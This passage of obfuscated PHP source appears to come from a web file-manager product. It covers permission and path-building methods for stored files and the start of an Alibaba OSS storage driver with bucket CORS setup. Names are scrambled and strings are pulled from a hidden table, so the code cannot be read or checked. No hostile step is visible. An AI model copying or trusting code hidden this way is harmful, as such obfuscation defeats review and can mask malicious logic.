&$Ã§‚“º©) { if (!$Ã§‚“º©[$”ŸÂ±[488]]) { continue; } $÷¯¾§ıª = is_array($ìå©æ¬À[$Ã§‚“º©[$”ŸÂ±[194]]]) ? $ìå©æ¬À[$Ã§‚“º©[$”ŸÂ±[194]]] : $¨ÓÖÆÚ; $Ã§‚“º©[$”ŸÂ±[243]] = $÷¯¾§ıª[$”ŸÂ±[243]]; $Ã§‚“º©[$”ŸÂ±[242]] = $÷¯¾§ıª[$”ŸÂ±[242]]; unset($Ã§‚“º©[$”ŸÂ±[489]]); } unset($Ã§‚“º©); } protected function _listAppendAuth(&$Ú†¾ß§ï) { $Ÿ†›„‡‘ =& $_SERVER[ÅÄÇĞô]; $şï–ĞÕø = array(); foreach ($Ú†¾ß§ï as $Ãœö£·) { if ($Ãœö£·[$Ÿ†›„‡‘[191]] == self::TYPE_GROUP) { $şï–ĞÕø[] = $Ãœö£·[$Ÿ†›„‡‘[194]]; } } if (!$şï–ĞÕø) { return; } $¿ÇÙÊÆó = array_to_keyvalue($Ú†¾ß§ï, $Ÿ†›„‡‘[194]); $Ä©’‹ş¯ = Model($Ÿ†›„‡‘[572])->getSourceList($şï–ĞÕø, $¿ÇÙÊÆó); $çğµ€“´ = KodUser::isRoot(); foreach ($Ú†¾ß§ï as $öæøé•¨ => &$Ãœö£·) { $Ãœö£·[$Ÿ†›„‡‘[490]] = $Ä©’‹ş¯[$Ãœö£·[$Ÿ†›„‡‘[194]]]; if (!$Ãœö£·[$Ÿ†›„‡‘[490]] && $Ãœö£·[$Ÿ†›„‡‘[191]] == self::TYPE_GROUP) { $Ãœö£·[$Ÿ†›„‡‘[490]] = Action($Ÿ†›„‡‘[573])->pathGroupAuthMake($Ãœö£·[$Ÿ†›„‡‘[574]]); if (!$Ãœö£·[$Ÿ†›„‡‘[490]] && !$çğµ€“´) { $Ãœö£·[$Ÿ†›„‡‘[236]] = !1; $Ãœö£·[$Ÿ†›„‡‘[235]] = !1; } } if ($Ãœö£·[$Ÿ†›„‡‘[490]]) { $Ãœö£·[$Ÿ†›„‡‘[236]] = AuthModel::authCheckEdit($Ãœö£·[$Ÿ†›„‡‘[490]][$Ÿ†›„‡‘[491]]); $Ãœö£·[$Ÿ†›„‡‘[235]] = AuthModel::authCheckView($Ãœö£·[$Ÿ†›„‡‘[490]][$Ÿ†›„‡‘[491]]); } $this->groupPathDisplay($Ãœö£·); } unset($Ãœö£·); } public function _listAppendAuthSecret(&$éíÁöèª) { $Åê—¬ğÌ =& $_SERVER[ÅÄÇĞô]; if (Model($Åê—¬ğÌ[511])->get($Åê—¬ğÌ[575]) != $Åê—¬ğÌ[91]) { return; } static $¿çğŞ—¬ = false; if (!$¿çğŞ—¬) { $ıÛş·× = Model($Åê—¬ğÌ[576]); $½ØÅüĞ³ = Model($Åê—¬ğÌ[577]); $¿çğŞ—¬ = $½ØÅüĞ³->listData(); $¿çğŞ—¬ = array_to_keyvalue($¿çğŞ—¬, $Åê—¬ğÌ[194]); $µË½ÎÙô = json_decode(Model($Åê—¬ğÌ[511])->get($Åê—¬ğÌ[578]), !0); $µË½ÎÙô = array_to_keyvalue($µË½ÎÙô, $Åê—¬ğÌ[478]); foreach ($¿çğŞ—¬ as $ÂĞİ => $àÔôÌ¾) { $æö‘÷öè = $µË½ÎÙô[$àÔôÌ¾[$Åê—¬ğÌ[579]]]; if (!$æö‘÷öè) { $½ØÅüĞ³->remove($àÔôÌ¾[$Åê—¬ğÌ[478]]); unset($¿çğŞ—¬[$ÂĞİ]); continue; } $ÜÁ¤ÆÉ = $ıÛş·×->listData($æö‘÷öè[$Åê—¬ğÌ[490]]); if (!$ÜÁ¤ÆÉ) { $½ØÅüĞ³->remove($àÔôÌ¾[$Åê—¬ğÌ[478]]); unset($¿çğŞ—¬[$ÂĞİ]); continue; } $àÔôÌ¾[$Åê—¬ğÌ[490]] = $ÜÁ¤ÆÉ; $àÔôÌ¾[$Åê—¬ğÌ[580]] = $æö‘÷öè; $àÔôÌ¾[$Åê—¬ğÌ[581]] = Model($Åê—¬ğÌ[582])->getInfoSimpleOuter($àÔôÌ¾[$Åê—¬ğÌ[530]]); $¿çğŞ—¬[$ÂĞİ] = $àÔôÌ¾; } } $€åÀ‡ù = USER_ID; $œ–ÇŠé = array(); $Ñ•œĞ‹¤ = $this->_listAppendPath($œ–ÇŠé, !0); foreach ($éíÁöèª as $ÂĞİ => &$àÔôÌ¾) { if (!is_array($àÔôÌ¾[$Åê—¬ğÌ[490]])) { continue; } if ($àÔôÌ¾[$Åê—¬ğÌ[191]] != $Åê—¬ğÌ[583]) { continue; } if (isset($¿çğŞ—¬[$àÔôÌ¾[$Åê—¬ğÌ[194]]])) { $¢çğ¶ú³ = $¿çğŞ—¬[$àÔôÌ¾[$Åê—¬ğÌ[194]]]; if (!is_array($àÔôÌ¾[$Åê—¬ğÌ[544]])) { $àÔôÌ¾[$Åê—¬ğÌ[544]] = array(); } $àÔôÌ¾[$Åê—¬ğÌ[544]][$Åê—¬ğÌ[584]] = $¢çğ¶ú³[$Åê—¬ğÌ[579]]; $àÔôÌ¾[$Åê—¬ğÌ[490]][$Åê—¬ğÌ[585]] = $¢çğ¶ú³; $àÔôÌ¾[$Åê—¬ğÌ[490]][$Åê—¬ğÌ[586]] = $àÔôÌ¾[$Åê—¬ğÌ[587]]; $àÔôÌ¾[$Åê—¬ğÌ[490]][$Åê—¬ğÌ[588]] = $Åê—¬ğÌ[91]; if ($¢çğ¶ú³[$Åê—¬ğÌ[530]] != $€åÀ‡ù) { $àÔôÌ¾[$Åê—¬ğÌ[490]][$Åê—¬ğÌ[491]] = $àÔôÌ¾[$Åê—¬ğÌ[490]][$Åê—¬ğÌ[491]] & $¢çğ¶ú³[$Åê—¬ğÌ[490]][$Åê—¬ğÌ[490]]; } continue; } $»ôï…Šº = $this->parentLevelArray($àÔôÌ¾[$Åê—¬ğÌ[589]]); $ö™‘Á«Ò = array_reverse($»ôï…Šº); foreach ($ö™‘Á«Ò as $ˆ®Ñå¼ => $Â²Âñ£‚) { if (!isset($¿çğŞ—¬[$Â²Âñ£‚])) { continue; } $¢çğ¶ú³ = $¿çğŞ—¬[$Â²Âñ£‚]; $àÔôÌ¾[$Åê—¬ğÌ[490]][$Åê—¬ğÌ[585]] = $¢çğ¶ú³; if ($¢çğ¶ú³[$Åê—¬ğÌ[530]] != $€åÀ‡ù) { $àÔôÌ¾[$Åê—¬ğÌ[490]][$Åê—¬ğÌ[491]] = $àÔôÌ¾[$Åê—¬ğÌ[490]][$Åê—¬ğÌ[491]] & $¢çğ¶ú³[$Åê—¬ğÌ[490]][$Åê—¬ğÌ[490]]; } $á®¯’–ñ = $Åê—¬ğÌ[12]; $¬„ù©£ß = count($»ôï…Šº) - $ˆ®Ñå¼; for ($¤ç×õÔÎ = 0; $¤ç×õÔÎ < $¬„ù©£ß; $¤ç×õÔÎ++) { if (!isset($Ñ•œĞ‹¤[$»ôï…Šº[$¤ç×õÔÎ]])) { $á®¯’–ñ = $Åê—¬ğÌ[12]; break; } $á®¯’–ñ = $á®¯’–ñ . rtrim($Ñ•œĞ‹¤[$»ôï…Šº[$¤ç×õÔÎ]], $Åê—¬ğÌ[8]) . $Åê—¬ğÌ[8]; } $àÔôÌ¾[$Åê—¬ğÌ[490]][$Åê—¬ğÌ[586]] = rtrim($á®¯’–ñ, $Åê—¬ğÌ[8]) . $Åê—¬ğÌ[8]; break; } } unset($àÔôÌ¾); } public function groupPathDisplay(&$±Ô¶í‚Å) { $ÖĞí—®¦ =& $_SERVER[ÅÄÇĞô]; if ($±Ô¶í‚Å[$ÖĞí—®¦[191]] != self::TYPE_GROUP) { return; } $”³…šŸû = Model($ÖĞí—®¦[590])->getInfo($±Ô¶í‚Å[$ÖĞí—®¦[574]]); $Şƒæ«Åñ = $this->parentLevelArray($”³…šŸû[$ÖĞí—®¦[589]]); $‡Ë”âŞ = $ÖĞí—®¦[12]; foreach ($Şƒæ«Åñ as $ÚéÇêÁâ) { $ô¡Éò­Ğ = Model($ÖĞí—®¦[590])->getInfo($ÚéÇêÁâ); $‡Ë”âŞ .= $ô¡Éò­Ğ[$ÖĞí—®¦[90]][$ÖĞí—®¦[194]] . $ÖĞí—®¦[50]; } $±Ô¶í‚Å[$ÖĞí—®¦[591]] = $”³…šŸû[$ÖĞí—®¦[193]]; $±Ô¶í‚Å[$ÖĞí—®¦[592]] = $”³…šŸû[$ÖĞí—®¦[589]]; $±Ô¶í‚Å[$ÖĞí—®¦[593]] = $”³…šŸû[$ÖĞí—®¦[594]]; $±Ô¶í‚Å[$ÖĞí—®¦[595]] = $‡Ë”âŞ . $”³…šŸû[$ÖĞí—®¦[90]][$ÖĞí—®¦[194]]; } protected function _listAppendPath(&$ê¨Î’·¾, $ŸÁàášŒ = false) { $ Ò€ØÇÜ =& $_SERVER[ÅÄÇĞô]; static $Ä³Æ©Šï = array(); $´¨íª­Ÿ = array(); $•µ€õªœ = array(); if ($ŸÁàášŒ) { return $Ä³Æ©Šï; } foreach ($ê¨Î’·¾ as &$¥çí«„Ø) { $Ö¦»ÁñŸ = $¥çí«„Ø[$ Ò€ØÇÜ[194]]; if ($¥çí«„Ø[$ Ò€ØÇÜ[488]] == $ Ò€ØÇÜ[91] && $¥çí«„Ø[$ Ò€ØÇÜ[193]] != 0) { $Ä³Æ©Šï[$Ö¦»ÁñŸ] = $¥çí«„Ø[$ Ò€ØÇÜ[32]]; } if ($¥çí«„Ø[$ Ò€ØÇÜ[488]] == $ Ò€ØÇÜ[91] && $¥çí«„Ø[$ Ò€ØÇÜ[193]] == 0) { $Ä³Æ©Šï[$Ö¦»ÁñŸ] = $this->_listAppendPathRoot($¥çí«„Ø, array()); } if (isset($•µ€õªœ[$¥çí«„Ø[$ Ò€ØÇÜ[589]]])) { continue; } $•µ€õªœ[$¥çí«„Ø[$ Ò€ØÇÜ[589]]] = !0; $İ´Ûû¶¥ = $this->parentLevelArray($¥çí«„Ø[$ Ò€ØÇÜ[589]]); foreach ($İ´Ûû¶¥ as $‰ Øé×º => $™å ³úç) { if (isset($Ä³Æ©Šï[$™å ³úç])) { continue; } if ($‰ Øé×º == 0) { $Ä³Æ©Šï[$™å ³úç] = $this->_listAppendPathRoot($¥çí«„Ø, $İ´Ûû¶¥); } if ($‰ Øé×º != 0) { $´¨íª­Ÿ[] = $™å ³úç; } } } unset($¥çí«„Ø); $´¨íª­Ÿ = array_unique($´¨íª­Ÿ); if (count($´¨íª­Ÿ) > 0) { $îı¶ò¨ = array($ Ò€ØÇÜ[494] => array($ Ò€ØÇÜ[495], $´¨íª­Ÿ)); if (count($´¨íª­Ÿ) == 1) { $ğ©İ¼¢ = $this->sourceInfo($´¨íª­Ÿ[0]); $üÇÃ˜Ò¦ = is_array($ğ©İ¼¢) ? array($ğ©İ¼¢) : !1; } else { $üÇÃ˜Ò¦ = $this->field($ Ò€ØÇÜ[596])->where($îı¶ò¨)->select(); } if (!$üÇÃ˜Ò¦) { $üÇÃ˜Ò¦ = array(); } foreach ($üÇÃ˜Ò¦ as $Æı›¯) { $Ä³Æ©Šï[$Æı›¯[$ Ò€ØÇÜ[194]]] = $Æı›¯[$ Ò€ØÇÜ[32]]; } } $·ô—½úõ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Õöïñ‹ã = array(); foreach ($ê¨Î’·¾ as &$¥çí«„Ø) { $æ²½›ºò = $¥çí«„Ø[$ Ò€ØÇÜ[589]]; $Ü¿¶®¸ = $ Ò€ØÇÜ[12]; if (isset($Õöïñ‹ã[$æ²½›ºò])) { $Ü¿¶®¸ = $Õöïñ‹ã[$æ²½›ºò]; } else { $İ´Ûû¶¥ = $this->parentLevelArray($¥çí«„Ø[$ Ò€ØÇÜ[589]]); foreach ($İ´Ûû¶¥ as $‰ Øé×º => $™å ³úç) { if (isset($Ä³Æ©Šï[$™å ³úç])) { $Ü¿¶®¸ .= $Ä³Æ©Šï[$™å ³úç] . $ Ò€ØÇÜ[8]; } } $Õöïñ‹ã[$æ²½›ºò] = $Ü¿¶®¸; } $Ü¿¶®¸ .= $¥çí«„Ø[$ Ò€ØÇÜ[32]]; if ($¥çí«„Ø[$ Ò€ØÇÜ[488]] == $ Ò€ØÇÜ[91]) { $Ü¿¶®¸ .= $ Ò€ØÇÜ[8]; } $¥çí«„Ø[$ Ò€ØÇÜ[587]] = str_replace($ Ò€ØÇÜ[257], $ Ò€ØÇÜ[8], $Ü¿¶®¸); if ($¥çí«„Ø[$ Ò€ØÇÜ[193]] == $ Ò€ØÇÜ[231]) { $¥çí«„Ø[$ Ò€ØÇÜ[32]] = trim($Ä³Æ©Šï[$¥çí«„Ø[$ Ò€ØÇÜ[194]]], $ Ò€ØÇÜ[8]); $¥çí«„Ø[$ Ò€ØÇÜ[587]] = $¥çí«„Ø[$ Ò€ØÇÜ[32]] . $ Ò€ØÇÜ[8]; } if (intval($¥çí«„Ø[$ Ò€ØÇÜ[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¥çí«„Ø, $İ´Ûû¶¥, $·ô—½úõ); } } unset($¥çí«„Ø); return $ê¨Î’·¾; } private function _listAppendPathRecycle(&$§µü Åà, $Øş²¥ªÙ, $îîÖ„ï¦) { $©¾¦úèê =& $_SERVER[ÅÄÇĞô]; if (!in_array($îîÖ„ï¦, $Øş²¥ªÙ) && $§µü Åà[$©¾¦úèê[194]] != $îîÖ„ï¦) { return; } $ªÄµúòì = explode($©¾¦úèê[8], trim($§µü Åà[$©¾¦úèê[587]], $©¾¦úèê[8])); $¾Í²…óÆ = implode($©¾¦úèê[8], array_slice($ªÄµúòì, 2)); $§µü Åà[$©¾¦úèê[587]] = $©¾¦úèê[8] . LNG($©¾¦úèê[597]) . $©¾¦úèê[8] . ltrim($¾Í²…óÆ, $©¾¦úèê[8]); $§µü Åà[$©¾¦úèê[589]] = $©¾¦úèê[598] . implode($©¾¦úèê[50], array_slice($Øş²¥ªÙ, 1)) . $©¾¦úèê[50]; if ($§µü Åà[$©¾¦úèê[194]] == $îîÖ„ï¦) { $§µü Åà[$©¾¦úèê[589]] = $©¾¦úèê[598]; $§µü Åà[$©¾¦úèê[193]] = $©¾¦úèê[231]; $§µü Åà[$©¾¦úèê[32]] = LNG($©¾¦úèê[597]); } $§µü Åà[$©¾¦úèê[599]] = $©¾¦úèê[600]; } protected function _listAppendPathRoot(&$‰Ê’¬ŠÁ, $°³¸ûÏ¡) { $ºŠ‘â”† =& $_SERVER[ÅÄÇĞô]; static $‰”î…ªƒ = false; static $ÄÁ÷’š¾ = false; $–ÙÈ§ğ² = $ºŠ‘â”†[12]; if ($‰Ê’¬ŠÁ[$ºŠ‘â”†[191]] == self::TYPE_USER) { if ($‰Ê’¬ŠÁ[$ºŠ‘â”†[574]] == USER_ID) { $–ÙÈ§ğ² = LNG($ºŠ‘â”†[601]); if ($‰”î…ªƒ === !1) { $ÓÜ„‚Î = Model($ºŠ‘â”†[602])->getInfoFull(USER_ID); $‰”î…ªƒ = _get($ÓÜ„‚Î, $ºŠ‘â”†[603], $ºŠ‘â”†[12]); } if ($ÄÁ÷’š¾ === !1) { $ÓÜ„‚Î = Model($ºŠ‘â”†[602])->getInfoFull(USER_ID); $ÄÁ÷’š¾ = _get($ÓÜ„‚Î, $ºŠ‘â”†[604], $ºŠ‘â”†[12]); } if ($°³¸ûÏ¡ && $°³¸ûÏ¡[0] == $‰”î…ªƒ || !$°³¸ûÏ¡ && $‰Ê’¬ŠÁ[$ºŠ‘â”†[194]] == $‰”î…ªƒ) { $–ÙÈ§ğ² = LNG($ºŠ‘â”†[605]); $‰Ê’¬ŠÁ[$ºŠ‘â”†[606]] = $ºŠ‘â”†[607]; } if ($°³¸ûÏ¡ && $°³¸ûÏ¡[0] == $ÄÁ÷’š¾ || !$°³¸ûÏ¡ && $‰Ê’¬ŠÁ[$ºŠ‘â”†[194]] == $ÄÁ÷’š¾) { $–ÙÈ§ğ² = $–ÙÈ§ğ² . $ºŠ‘â”†[608] . LNG($ºŠ‘â”†[609]); } if (!$°³¸ûÏ¡) { $‰Ê’¬ŠÁ[$ºŠ‘â”†[32]] = $–ÙÈ§ğ²; } } else { $ÓÜ„‚Î = Model($ºŠ‘â”†[602])->getInfoFull($‰Ê’¬ŠÁ[$ºŠ‘â”†[574]]); $–¯¥´¯ = _get($ÓÜ„‚Î, $ºŠ‘â”†[604], $ºŠ‘â”†[12]); $‰Ê’¬ŠÁ[$ºŠ‘â”†[610]] = Model($ºŠ‘â”†[582])->getInfoSimpleOuter($‰Ê’¬ŠÁ[$ºŠ‘â”†[574]]); $–ÙÈ§ğ² = LNG($ºŠ‘â”†[611]) . $ºŠ‘â”†[176] . $‰Ê’¬ŠÁ[$ºŠ‘â”†[610]][$ºŠ‘â”†[32]] . $ºŠ‘â”†[178]; if ($°³¸ûÏ¡ && $°³¸ûÏ¡[0] == $–¯¥´¯ || !$°³¸ûÏ¡ && $‰Ê’¬ŠÁ[$ºŠ‘â”†[194]] == $–¯¥´¯) { $–ÙÈ§ğ² = LNG($ºŠ‘â”†[611]) . $ºŠ‘â”†[612] . $‰Ê’¬ŠÁ[$ºŠ‘â”†[610]][$ºŠ‘â”†[32]] . $ºŠ‘â”†[608] . LNG($ºŠ‘â”†[609]) . $ºŠ‘â”†[178]; } } } else { if ($‰Ê’¬ŠÁ[$ºŠ‘â”†[191]] == self::TYPE_GROUP) { $“×š¶ = Model($ºŠ‘â”†[590])->getInfoSimple($‰Ê’¬ŠÁ[$ºŠ‘â”†[574]]); $–ÙÈ§ğ² = $“×š¶[$ºŠ‘â”†[32]]; } else { if ($‰Ê’¬ŠÁ[$ºŠ‘â”†[191]] == self::TYPE_SYSTEM) { $–ÙÈ§ğ² = $ºŠ‘â”†[613]; } } } $–ÙÈ§ğ² = $–ÙÈ§ğ² ? $ºŠ‘â”†[8] . $–ÙÈ§ğ² . $ºŠ‘â”†[8] : $ºŠ‘â”†[8]; return $–ÙÈ§ğ²; } protected function _listAppendUser(&$İÆÔÀ“²) { $®“–ÉËÔ =& $_SERVER[ÅÄÇĞô]; $ù›ûÉú = array_to_keyvalue($İÆÔÀ“², $®“–ÉËÔ[12], $®“–ÉËÔ[530]); $ı¦Ú³½ö = array_to_keyvalue($İÆÔÀ“², $®“–ÉËÔ[12], $®“–ÉËÔ[532]); $ÜÙú±™Ğ = array_merge($ù›ûÉú, $ı¦Ú³½ö); $ë—õ = Model($®“–ÉËÔ[602])->userListInfo($ÜÙú±™Ğ); foreach ($İÆÔÀ“² as &$ã¯à±íÇ) { $ÛÓğµ”Å = $ã¯à±íÇ[$®“–ÉËÔ[530]]; $ã¯à±íÇ[$®“–ÉËÔ[530]] = $ë—õ[$ÛÓğµ”Å] ? $ë—õ[$ÛÓğµ”Å] : !1; $ÛÓğµ”Å = $ã¯à±íÇ[$®“–ÉËÔ[532]]; $ã¯à±íÇ[$®“–ÉËÔ[532]] = $ë—õ[$ÛÓğµ”Å] ? $ë—õ[$ÛÓğµ”Å] : !1; if (_get($ã¯à±íÇ, $®“–ÉËÔ[614], 0)) { $—Ø×Ñ– = $GLOBALS[$®“–ÉËÔ[6]][$®“–ÉËÔ[92]][$®“–ÉËÔ[615]]; if ($ã¯à±íÇ[$®“–ÉËÔ[544]][$®“–ÉËÔ[616]] <= time() - $—Ø×Ñ–) { $this->metaSet($ã¯à±íÇ[$®“–ÉËÔ[194]], $®“–ÉËÔ[617], null); $this->metaSet($ã¯à±íÇ[$®“–ÉËÔ[194]], $®“–ÉËÔ[616], null); unset($ã¯à±íÇ[$®“–ÉËÔ[544]][$®“–ÉËÔ[617]]); continue; } $ê«øåİİ = $ã¯à±íÇ[$®“–ÉËÔ[544]][$®“–ÉËÔ[617]]; $ã¯à±íÇ[$®“–ÉËÔ[544]][$®“–ÉËÔ[618]] = Model($®“–ÉËÔ[602])->getInfoSimpleOuter($ê«øåİİ); } } unset($ã¯à±íÇ); } public function parentLevelArray($ßÔçœô) { $È„…ş´× =& $_SERVER[ÅÄÇĞô]; $ßÔçœô = explode($È„…ş´×[50], trim($ßÔçœô, $È„…ş´×[50])); return array_remove_value($ßÔçœô, $È„…ş´×[231]); } public function listAll($ÛÑ‰í‹ò) { $¼Ã¦åŸ =& $_SERVER[ÅÄÇĞô]; $‚ıáõÔÚ = $this->sourceInfo($ÛÑ‰í‹ò); $›ñ»£‰ó = array($¼Ã¦åŸ[619] => array($¼Ã¦åŸ[620], $‚ıáõÔÚ[$¼Ã¦åŸ[589]] . $ÛÑ‰í‹ò . $¼Ã¦åŸ[621]), $¼Ã¦åŸ[622] => 0); $¥ïÈéüß = $¼Ã¦åŸ[623]; $½×ıëçñ = "\114\x45\106\124\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\x69\x6f\x5f\146\x69\154\145\40\146\151\x6c\145\40\157\156\x20\163\x6f\x75\162\x63\x65\x2e\146\x69\154\145\x49\x44\40\x3d\x20\x66\x69\154\145\x2e\x66\x69\154\x65\111\x44"; $¥¨ŠÔ€ = $this->alias($¼Ã¦åŸ[522])->field($¥ïÈéüß)->where($›ñ»£‰ó)->join($½×ıëçñ)->select(); $this->_listAppendAuth($¥¨ŠÔ€); $this->_listAppendUser($¥¨ŠÔ€); $this->_listAppendPath($¥¨ŠÔ€); $¥¨ŠÔ€ = array_to_keyvalue($¥¨ŠÔ€, $¼Ã¦åŸ[194]); $µœŠÜ§â = "\x2f{$‚ıáõÔÚ[$¼Ã¦åŸ[32]]}\x2f"; $µœŠÜ§â = $µœŠÜ§â == $¼Ã¦åŸ[257] ? $¼Ã¦åŸ[8] : $µœŠÜ§â; $ö‡™¿ÁÉ = array(); foreach ($¥¨ŠÔ€ as $òÌ€‚¾Ä => $ä ÔÁè–) { $•¬½ÚÏ = $this->parentLevelArray($ä ÔÁè–[$¼Ã¦åŸ[589]]); array_shift($•¬½ÚÏ); $÷Ù÷ËÛø = $µœŠÜ§â; for ($ç¾‘ˆ‚± = 0; $ç¾‘ˆ‚± < count($•¬½ÚÏ); $ç¾‘ˆ‚±++) { $÷Ù÷ËÛø .= $¥¨ŠÔ€[$•¬½ÚÏ[$ç¾‘ˆ‚±]][$¼Ã¦åŸ[32]] . $¼Ã¦åŸ[8]; } $÷Ù÷ËÛø .= $ä ÔÁè–[$¼Ã¦åŸ[32]]; if ($ä ÔÁè–[$¼Ã¦åŸ[488]]) { $÷Ù÷ËÛø .= $¼Ã¦åŸ[8]; } $³ÚöÂĞ = array($¼Ã¦åŸ[498] => str_replace($¼Ã¦åŸ[257], $¼Ã¦åŸ[8], str_replace($¼Ã¦åŸ[257], $¼Ã¦åŸ[8], str_replace($¼Ã¦åŸ[257], $¼Ã¦åŸ[8], $÷Ù÷ËÛø))), $¼Ã¦åŸ[624] => intval($ä ÔÁè–[$¼Ã¦åŸ[488]]), $¼Ã¦åŸ[625] => intval($ä ÔÁè–[$¼Ã¦åŸ[79]]), $¼Ã¦åŸ[88] => intval($ä ÔÁè–[$¼Ã¦åŸ[88]]), $¼Ã¦åŸ[90] => $this->pathInfoFilter($ä ÔÁè–)); if (!$³ÚöÂĞ[$¼Ã¦åŸ[488]]) { $³ÚöÂĞ[$¼Ã¦åŸ[546]] = $ä ÔÁè–[$¼Ã¦åŸ[546]]; } $ö‡™¿ÁÉ[] = $³ÚöÂĞ; } $ö‡™¿ÁÉ = array_sort_by($ö‡™¿ÁÉ, $¼Ã¦åŸ[87]); return $ö‡™¿ÁÉ; } } goto E¹„ã‹Õã; eÃïßŠæÉÊ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($î•£‘â) { parent::__construct(); include_once SDK_DIR . $_SERVER[ÅÄÇĞô][1486]; $this->_init($î•£‘â); } public function _init($şğŞ¹ïÏ) { $Ş‡âö¦ö =& $_SERVER[ÅÄÇĞô]; $this->config = $şğŞ¹ïÏ; foreach ($şğŞ¹ïÏ as $şÑ–àÃ› => $€ Ôé ) { if (isset($this->{$şÑ–àÃ›})) { $this->{$şÑ–àÃ›} = $€ Ôé ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ş‡âö¦ö[1487] . LNG($Ş‡âö¦ö[1488])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Œ§È¥£ä =& $_SERVER[ÅÄÇĞô]; $ÄÊù´ƒ = new OSS\Model\CorsConfig(); $š¤ë„»š = new OSS\Model\CorsRule(); $š¤ë„»š->addAllowedOrigin($Œ§È¥£ä[1489]); $š¤ë„»š->addAllowedMethod($Œ§È¥£ä[1490]); $š¤ë„»š->addAllowedMethod($Œ§È¥£ä[1491]); $š¤ë„»š->addAllowedMethod($Œ§È¥£ä[1492]); $š¤ë„»š->addAllowedMethod($Œ§È¥£ä[1493]); $š¤ë„»š->addAllowedMethod($Œ§È¥£ä[165]); $š¤ë„»š->setMaxAgeSeconds(600); $š¤ë„»š->addExposeHeader($Œ§È¥£ä[1494]); $š¤ë„»š->addAllowedHeader($Œ§È¥£ä[1489]); $ÄÊù´ƒ->addRule($š¤ë„»š); try { $this->client->putBucketCors($this->bucket, $ÄÊù´ƒ); } catch (OSS\Core\OssException $‰ßö˜ó…) { $this->writeLog(__FUNCTION__ . $Œ§È¥£ä[215] . $‰ßö˜ó…->getMessage()); return !1; } return !0; } public function getBucketCors() { $§èÄËéÃ =& $_SERVER[ÅÄÇĞô]; $» ›şŸ = null; try { $» ›şŸ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $úÓ£¹»Ä) { $this->writeLog(__FUNCTION__ . $§èÄËéÃ[215] . $úÓ£¹»Ä->getMessage()); return null; } if (!$» ›şŸ || !($˜Š°Šœ• = $» ›şŸ->getRules())) { return null; } $ÍƒËæô = $˜Š°Šœ•[0]->getAllowedOrigins(); $œú©èÍ = $˜Š°Šœ•[0]->getAllowedMethods(); $ÒËê£ = $˜Š°Šœ•[0]->getMaxAgeSeconds(); $øùç·¡± = $˜Š°Šœ•[0]->getExposeHeaders(); $ÕÅ•±à— = $˜Š°Šœ•[0]->getAllowedHeaders(); return array($§èÄËéÃ[221] => isset($ÍƒËæô[0]) ? $ÍƒËæô[0] : $§èÄËéÃ[12], $§èÄËéÃ[225] => $œú©èÍ, $§èÄËéÃ[1495] => $ÒËê£, $§èÄËéÃ[1496] => isset($øùç·¡±[0]) ? $øùç·¡±[0] : $§èÄËéÃ[12], $§èÄËéÃ[222] => isset($ÕÅ•±à—[0]) ? $ÕÅ•±à—[0] : $§èÄËéÃ[12]); } public function isBucketCors() { $áµõ•„å =& $_SERVER[ÅÄÇĞô]; $íòØÇ­’ = $this->getBucketCors(); if (!$íòØÇ­’ || !is_array($íòØÇ­’)) { return !1; } if ($íòØÇ­’[$áµõ•„å[221]] != $áµõ•„å[223] || $íòØÇ­’[$áµõ•„å[222]] != $áµõ•„å[223]) { return !1; } $½™ìòŠ = array_map($áµõ•„å[224], $íòØÇ­’[$áµõ•„å[225]]); if (!is_array($½™ìòŠ)) { $½™ìòŠ = array(); } $öÈÂçà• = array($áµõ•„å[226], $áµõ•„å[227], $áµõ•„å[228], $áµõ•„å[229], $áµõ•„å[230]); $Æœ«´¶° = array_diff($öÈÂçà•, $½™ìòŠ); return empty($Æœ«´¶°); } public function mkfile($õß†Ô¾…, $“®ùŞÒİ = '', $ÉŠ‡Åç = REPEAT_RENAME) { $Á›Ìñà£ = $this->setContent($õß†Ô¾…, $“®ùŞÒİ); if ($Á›Ìñà£ !== !1) { return $this->getPathOuter($õß†Ô¾…); } return !1; } public function mkdir($æ¢¡òõá, $ÛêıÈó¦ = REPEAT_SKIP) { if ($ÛêıÈó¦ && $this->_isFolder($æ¢¡òõá)) { return $this->getPathOuter($æ¢¡òõá); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($æ¢¡òõá)); } catch (OSS\Core\OssException $¹ÂÚ„ÁŒ) { $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][215] . $¹ÂÚ„ÁŒ->getMessage()); return !1; } return $this->getPathOuter($æ¢¡òõá); } private function fileList($˜÷Î¾¤, $²Œ×šŞÄ = '', $ÉƒÕîãº = 0) { $“­îıèß =& $_SERVER[ÅÄÇĞô]; $˜÷Î¾¤ = trim($˜÷Î¾¤, $“­îıèß[8]); $áßÒÆ—÷ = empty($˜÷Î¾¤) && $˜÷Î¾¤ !== $“­îıèß[231] ? $“­îıèß[12] : $˜÷Î¾¤ . $“­îıèß[8]; $°âŸ—¤ = $“­îıèß[12]; $Š¨åì“Ê = 1000; $ñÓÉŞ³Ê = $šÇ†æØæ = array(); while (!0) { check_abort(); $ÅÚ‘™Ğú = array($“­îıèß[1497] => $²Œ×šŞÄ, $“­îıèß[1498] => $áßÒÆ—÷, $“­îıèß[1499] => $Š¨åì“Ê, $“­îıèß[1500] => $°âŸ—¤); try { $´û€°Ï° = $this->client->listObjects($this->bucket, $ÅÚ‘™Ğú); } catch (OSS\Core\OssException $Æç£úÔã) { $this->writeLog(__FUNCTION__ . $“­îıèß[215] . $Æç£úÔã->getMessage()); break; } $°âŸ—¤ = $´û€°Ï°->getNextMarker(); $§í’Ô = $´û€°Ï°->getObjectList(); $Ÿêú½¹ = $´û€°Ï°->getPrefixList(); foreach ($§í’Ô as $õ˜àûÖ) { if ($õ˜àûÖ->getKey() == $áßÒÆ—÷) { continue; } $½Ç¯Îü = $õ˜àûÖ->getKey(); $²ôŠµ§é = $õ˜àûÖ->getSize(); 